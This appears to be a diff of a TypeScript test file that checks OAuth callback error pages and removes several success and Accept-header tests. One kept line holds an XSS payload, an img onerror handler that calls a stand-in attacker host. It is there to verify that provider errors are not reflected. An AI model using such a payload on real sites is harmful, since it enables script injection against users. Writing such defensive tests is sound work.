@@ -1,7 +1,6 @@
 import { afterAll, afterEach, beforeAll, describe, expect, it, mock } from "bun:test";
-import { accounts, closeDb, getDb, users } from "@stwd/db";
+import { closeDb } from "@stwd/db";
 import { createPGLiteDb, setPGLiteOverride } from "@stwd/db/pglite";
-import { eq } from "drizzle-orm";
 
 const REDIRECT_URI = "https://app.example.test/callback?from=oauth";
 const ORIGINAL_FETCH = globalThis.fetch;
@@ -35,8 +34,6 @@ beforeAll(async () => {
   process.env.NODE_ENV = "test";
   process.env.STEWARD_PGLITE_MEMORY = "true";
   process.env.STEWARD_MASTER_PASSWORD = "oauth-callback-browser-master-password";
-  process.env.STEWARD_JWT_SECRET = "oauth-callback-browser-jwt-secret-with-enough-bytes";
-  process.env.STEWARD_AUDIT_HMAC_KEY = "b".repeat(64);
   const { db, client } = await createPGLiteDb("memory://");
   setPGLiteOverride(db, async () => {
     await client.close();
@@ -58,81 +55,9 @@ afterAll(async () => {
   delete process.env.NODE_ENV;
   delete process.env.STEWARD_PGLITE_MEMORY;
   delete process.env.STEWARD_MASTER_PASSWORD;
-  delete process.env.STEWARD_JWT_SECRET;
-  delete process.env.STEWARD_AUDIT_HMAC_KEY;
 });
 
 describe("OAuth browser callback failures", () => {
-  for (const client of [
-    { name: "a browser navigation", suffix: "browser", headers: browserHeaders() },
-    { name: "an explicit JSON client", suffix: "json", headers: { accept: "application/json" } },
-  ]) {
-    it(`completes wallet-backed OAuth for ${client.name} without exposing tokens`, async () => {
-      const { suffix } = client;
-      const state = `successful-${suffix}-state`;
-      const providerAccountId = `google-success-${suffix}`;
-      const email = `oauth-success-${suffix}@example.test`;
-      process.env.APP_URL = "https://api.example.test";
-      process.env.GOOGLE_CLIENT_ID = "google-client";
-      process.env.GOOGLE_CLIENT_SECRET = "google-secret";
-      process.env.STEWARD_OAUTH_ALLOWED_REDIRECTS = REDIRECT_URI;
-      await getAuthChallengeStore().set(
-        `oauth:${state}`,
-        JSON.stringify({
-          provider: "google",
-          redirectUri: REDIRECT_URI,
-          appState: `client-${suffix}-state`,
-        }),
-      );
-      globalThis.fetch = mock(async (input: RequestInfo | URL) => {
-        const url = String(input);
-        if (url === "https://oauth2.googleapis.com/token") {
-          return Response.json({
-            access_token: `provider-access-${suffix}`,
-            refresh_token: `provider-refresh-${suffix}`,
-            expires_in: 3600,
-            token_type: "Bearer",
-          });
-        }
-        if (url === "https://www.googleapis.com/oauth2/v3/userinfo") {
-          return Response.json({
-            id: providerAccountId,
-            email,
-            name: `OAuth Success ${suffix}`,
-            verified_email: true,
-          });
-        }
-        return new Response("unexpected provider request", { status: 500 });
-      }) as unknown as typeof fetch;
-
-      const response = await authRoutes.request(
-        `/oauth/google/callback?code=provider-code&state=${state}`,
-        { headers: client.headers },
-      );
-
-      expect(response.status).toBe(302);
-      const location = response.headers.get("location");
-      expect(location).toStartWith(`${REDIRECT_URI}#`);
-      expect(location).toContain(`state=client-${suffix}-state`);
-      expect(location).not.toContain("token=");
-      expect(location).not.toContain(`provider-access-${suffix}`);
-      expect(location).not.toContain(`provider-refresh-${suffix}`);
-
-      const [account] = await getDb()
-        .select({ userId: accounts.userId, accessTokenEncrypted: accounts.accessTokenEncrypted })
-        .from(accounts)
-        .where(eq(accounts.providerAccountId, providerAccountId));
-      expect(account?.accessTokenEncrypted).toBeTruthy();
-      expect(account?.accessTokenEncrypted).not.toBe(`provider-access-${suffix}`);
-      const [user] = await getDb()
-        .select({ walletAddress: users.walletAddress, stewardWalletId: users.stewardWalletId })
-        .from(users)
-        .where(eq(users.id, account?.userId ?? "00000000-0000-0000-0000-000000000000"));
-      expect(user?.walletAddress).toMatch(/^0x[0-9a-f]{40}$/i);
-      expect(user?.stewardWalletId).toBeTruthy();
-    });
-  }
-
   it("renders a non-reflective HTML page for provider errors", async () => {
     const attackerText = '<img src=x onerror="fetch(`https://attacker.test`) ">';
     process.env.STEWARD_OAUTH_ALLOWED_REDIRECTS = REDIRECT_URI;
@@ -179,25 +104,6 @@ describe("OAuth browser callback failures", () => {
       error: "This sign-in attempt is invalid or has expired.",
       code: "oauth_state_expired",
     });
-  });
-
-  it("uses HTML for a navigation with no Accept header", async () => {
-    const response = await authRoutes.request(
-      "/oauth/github/callback?code=provider-code&state=expired-no-accept-navigation-state",
-      { headers: { "sec-fetch-mode": "navigate" } },
-    );
-
-    await expectBrowserError(response, { status: 401, code: "oauth_state_expired" });
-  });
-
-  it("keeps JSON with no Accept header when the request is not a navigation", async () => {
-    const response = await authRoutes.request(
-      "/oauth/github/callback?code=provider-code&state=expired-no-accept-client-state",
-    );
-
-    expect(response.status).toBe(401);
-    expect(response.headers.get("content-type")).toContain("application/json");
-    expect(await response.json()).toMatchObject({ ok: false, code: "oauth_state_expired" });
   });
 
   it("honors an explicit q=0 rejection of HTML even for navigation-shaped requests", async () => {
